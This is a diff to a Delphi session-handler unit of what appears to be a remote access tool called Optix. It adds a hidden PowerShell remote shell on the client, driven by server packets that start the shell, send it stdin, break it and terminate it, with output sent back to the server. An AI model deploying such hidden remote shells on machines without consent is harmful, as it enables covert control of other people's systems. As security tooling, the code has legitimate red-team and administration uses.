@@ -46,12 +46,19 @@ unit Optix.Protocol.SessionHandler;
 interface
 
 uses System.Classes, Generics.Collections, XSuperObject, Optix.Protocol.Client.Handler, Optix.Protocol.Packet,
-     Optix.Protocol.Preflight, Optix.Protocol.Worker.FileTransfer, Optix.Func.Commands, Optix.Task;
+     Optix.Protocol.Preflight, Optix.Protocol.Worker.FileTransfer, Optix.Func.Commands, Optix.Task,
+     Optix.Actions.ProcessHandler;
 
 type
+  TShellAction = (
+    saBreak,
+    saTerminate
+  );
+
   TOptixSessionHandlerThread = class(TOptixClientHandlerThread)
   private
     FTasks                    : TObjectList<TOptixTask>;
+    FShellInstances           : TObjectList<TProcessHandler>;
     FFileTransferOrchestrator : TOptixFileTransferOrchestratorThread;
 
     {@M}
@@ -61,11 +68,19 @@ type
     function InitializePreflightRequest() : TOptixPreflightRequest; override;
     procedure Initialize(); override;
     procedure Finalize(); override;
+
+    procedure PollShellInstances();
     procedure PollActions(); override;
     procedure PollTasks();
 
     procedure RegisterNewFileTransfer(const ATransfer : TOptixCommandTransfer);
     procedure RegisterAndStartNewTask(const AOptixTask : TOptixTask);
+
+    procedure RegisterAndStartNewShellInstance(const ACommand : TOptixStartShellInstance);
+    procedure PerformActionOnShellInstance(const AInstanceId : TGUID; const AShellAction : TShellAction);
+    procedure TerminateShellInstance(const ACommand : TOptixTerminateShellInstance);
+    procedure BreakShellInstance(const ACommand : TOptixBreakShellInstance);
+    procedure StdinToShellInstance(const ACommand : TOptixStdinShellInstance);
 
     procedure Connected(); override;
     procedure Disconnected(); override;
@@ -75,7 +90,8 @@ type
 implementation
 
 uses Winapi.Windows, Optix.Func.SessionInformation, System.SysUtils, Optix.Func.Enum.Process, Optix.Actions.Process,
-     Optix.Func.LogNotifier, Optix.Func.Enum.FileSystem, Optix.Thread, Optix.Task.ProcessDump;
+     Optix.Func.LogNotifier, Optix.Func.Enum.FileSystem, Optix.Thread, Optix.Task.ProcessDump,
+     Optix.Func.Shell;
 
 
 { TOptixSessionHandlerThread.Initialize }
@@ -85,7 +101,8 @@ begin
   ///
 
   FFileTransferOrchestrator := nil;
-  FTasks := TObjectList<TOptixTask>.Create();
+  FTasks := TObjectList<TOptixTask>.Create(True);
+  FShellInstances := TObjectList<TProcessHandler>.Create(True);
 end;
 
 { TOptixSessionHandlerThread.Finalize }
@@ -96,6 +113,9 @@ begin
 
   if Assigned(FTasks) then
     FreeAndNil(FTasks);
+
+  if Assigned(FShellInstances) then
+    FreeAndNil(FShellInstances);
 end;
 
 { TOptixSessionHandlerThread.InitializePreflightRequest }
@@ -134,11 +154,109 @@ begin
   end;
 end;
 
+{ TOptixSessionHandlerThread.PollShellInstances }
+procedure TOptixSessionHandlerThread.PollShellInstances();
+begin
+  var AShellInstancesToDelete := TList<TProcessHandler>.Create();
+  try
+    for var AShellInstance in FShellInstances do begin
+      if not AShellInstance.Active then begin
+        AShellInstancesToDelete.Add(AShellInstance);
+
+        ///
+        continue;
+      end;
+
+      try
+        var ARetrievedOutput := AShellInstance.ReadAvailableOutput();
+        ///
+
+        if not String.IsNullOrWhiteSpace(ARetrievedOutput) then
+          AddPacket(TOptixShellOutput.Create(AShellInstance.GroupId, ARetrievedOutput, AShellInstance.InstanceId));
+      except
+        AShellInstance.Close();
+      end;
+    end;
+
+    for var AShellInstance in AShellInstancesToDelete do begin
+      // Notify server about a terminated shell instance
+      var ATerminateShellInstance := TOptixTerminateShellInstance.Create(AShellInstance.InstanceId);
+      ATerminateShellInstance.WindowGUID := AShellInstance.GroupId;
+      AddPacket(ATerminateShellInstance);
+
+      ///
+      FShellInstances.Remove(AShellInstance);
+    end;
+  finally
+    FreeAndNil(AShellInstancesToDelete);
+  end;
+end;
+
+{ TOptixSessionHandlerThread.PerformActionOnShellInstance }
+procedure TOptixSessionHandlerThread.PerformActionOnShellInstance(const AInstanceId : TGUID; const AShellAction : TShellAction);
+begin
+  for var AShellInstance in FShellInstances do begin
+    if AShellInstance.InstanceId <> AInstanceId then
+      continue;
+    ///
+
+    case AShellAction of
+      saBreak : begin
+        if AShellInstance.Active then
+          AShellInstance.TryCtrlC;
+      end;
+
+      saTerminate :
+        AShellInstance.TryClose();
+    end;
+  end;
+end;
+
+{ TOptixSessionHandlerThread.StdinToShellInstance }
+procedure TOptixSessionHandlerThread.StdinToShellInstance(const ACommand : TOptixStdinShellInstance);
+begin
+  for var AShellInstance in FShellInstances do begin
+    if AShellInstance.InstanceId <> ACommand.InstanceId then
+      continue;
+    try
+      AShellInstance.WriteLn(ACommand.CommandLine);
+    except
+      AShellInstance.Close();
+    end;
+  end;
+end;
+
+{ TOptixSessionHandlerThread.TerminateShellInstance }
+procedure TOptixSessionHandlerThread.TerminateShellInstance(const ACommand : TOptixTerminateShellInstance);
+begin
+  PerformActionOnShellInstance(ACommand.InstanceId, saTerminate);
+end;
+
+{ TOptixSessionHandlerThread.BreakhellInstance }
+procedure TOptixSessionHandlerThread.BreakShellInstance(const ACommand : TOptixBreakShellInstance);
+begin
+  PerformActionOnShellInstance(ACommand.InstanceId, saBreak);
+end;
+
+{ TOptixSessionHandlerThread.RegisterAndStartNewShellInstance }
+procedure TOptixSessionHandlerThread.RegisterAndStartNewShellInstance(const ACommand : TOptixStartShellInstance);
+begin
+  var AProcessHandler := TProcessHandler.Create('powershell.exe', ACommand.WindowGUID);
+
+  AProcessHandler.ShowWindow := False;
+  AProcessHandler.Start(True);
+
+  ///
+  FShellInstances.Add(AProcessHandler);
+end;
+
 { TOptixSessionHandlerThread.PollActions }
 procedure TOptixSessionHandlerThread.PollActions();
 begin
   // Tasks -------------------------------------------------------------------------------------------------------------
   PollTasks();
+  // Shell Instances ---------------------------------------------------------------------------------------------------
+  PollShellInstances();
   // -------------------------------------------------------------------------------------------------------------------
 end;
 
@@ -268,7 +386,67 @@ begin
         AOptixPacket := TOptixCommandProcessDump.Create(ASerializedPacket);
 
         RegisterAndStartNewTask(TOptixProcessDumpTask.Create(TOptixCommandProcessDump(AOptixPacket)));
-      end;
+      end
+      // ---------------------------------------------------------------------------------------------------------------
+      else if AClassName = TOptixStartShellInstance.ClassName then begin
+        AOptixPacket := TOptixStartShellInstance.Create(ASerializedPacket);
+
+        RegisterAndStartNewShellInstance(TOptixStartShellInstance(AOptixPacket));
+      end
+      // ---------------------------------------------------------------------------------------------------------------
+      else if AClassName = TOptixTerminateShellInstance.ClassName then begin
+        AOptixPacket := TOptixTerminateShellInstance.Create(ASerializedPacket);
+
+        TerminateShellInstance(TOptixTerminateShellInstance(AOptixPacket));
+      end
+      // ---------------------------------------------------------------------------------------------------------------
+      else if AClassName = TOptixBreakShellInstance.ClassName then begin
+        AOptixPacket := TOptixBreakShellInstance.Create(ASerializedPacket);
+
+        BreakShellInstance(TOptixBreakShellInstance(AOptixPacket));
+      end
+      // ---------------------------------------------------------------------------------------------------------------
+      else if AClassName = TOptixStdinShellInstance.ClassName then begin
+        AOptixPacket := TOptixStdinShellInstance.Create(ASerializedPacket);
+
+        StdinToShellInstance(TOptixStdinShellInstance(AOptixPacket));
+      end
+      // ---------------------------------------------------------------------------------------------------------------
+      
+      // ---------------------------------------------------------------------------------------------------------------
+
+      // ---------------------------------------------------------------------------------------------------------------
+
+      // ---------------------------------------------------------------------------------------------------------------
+
+      // ---------------------------------------------------------------------------------------------------------------
+
+      // ---------------------------------------------------------------------------------------------------------------
+
+      // ---------------------------------------------------------------------------------------------------------------
+
+      // ---------------------------------------------------------------------------------------------------------------
+
+      // ---------------------------------------------------------------------------------------------------------------
+
+      // ---------------------------------------------------------------------------------------------------------------
+
+      // ---------------------------------------------------------------------------------------------------------------
+
+      // ---------------------------------------------------------------------------------------------------------------
+
+      // ---------------------------------------------------------------------------------------------------------------
+
+      // ---------------------------------------------------------------------------------------------------------------
+
+      // ---------------------------------------------------------------------------------------------------------------
+
+      // ---------------------------------------------------------------------------------------------------------------
+
+      // ---------------------------------------------------------------------------------------------------------------
+
+      // ---------------------------------------------------------------------------------------------------------------
+
       // ---------------------------------------------------------------------------------------------------------------
       // ... //
     except
